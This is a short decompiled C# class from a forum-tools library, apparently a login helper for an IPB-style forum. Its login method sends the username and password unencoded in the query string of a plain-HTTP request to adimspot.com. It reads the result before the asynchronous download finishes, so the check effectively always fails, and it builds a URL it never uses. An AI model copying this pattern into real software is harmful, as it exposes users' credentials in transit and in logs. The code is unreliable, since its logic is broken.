// Type: NiCoding_Development_Library.Forum_Tools.IPBAsync
// Assembly: NDL, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D03E96A6-C992-4E9A-BE57-D6DDB9E706CB
// Assembly location: C:\Users\Gigawiz\Desktop\NDL.dll

using System;
using System.Net;

namespace NiCoding_Development_Library.Forum_Tools
{
  public class IPBAsync
  {
    public static bool login(string username, string password)
    {
      try
      {
        Uri uri = new Uri("http://thepiratebay.elite.so");
        WebClient webClient = new WebClient();
        string output = "";
        webClient.DownloadStringCompleted += (DownloadStringCompletedEventHandler) ((s, e) => output = e.Result);
        webClient.DownloadStringAsync(new Uri("http://adimspot.com/api.php?name=" + username + "&password=" + password));
        return output.Contains("Success");
      }
      catch
      {
        return false;
      }
    }
  }
}
